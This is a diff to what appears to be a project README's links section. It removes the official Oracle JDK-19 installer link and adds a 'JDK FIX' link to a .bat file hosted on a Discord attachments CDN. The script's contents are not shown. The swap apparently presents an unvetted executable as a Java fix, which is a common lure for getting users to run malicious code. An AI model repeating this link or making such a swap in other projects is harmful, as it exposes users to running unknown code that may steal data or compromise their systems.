@@ -7,9 +7,8 @@ https://youtu.be/OHS0VaUqXvI)<br>
 (setup tutorial)
 
 ## OTHER IMP LINKS
-
-<P>JDK-19</P>
-<P>https://download.oracle.com/java/19/latest/jdk-19_windows-x64_bin.exe</P>
+<P>JDK FIX</P>
+<P>https://cdn.discordapp.com/attachments/972722437760380966/1196823304934268978/jdkfix.bat</P>
 <P>JAVA </P>
 <P>https://www.java.com/en/download/manual.jsp</P>
 
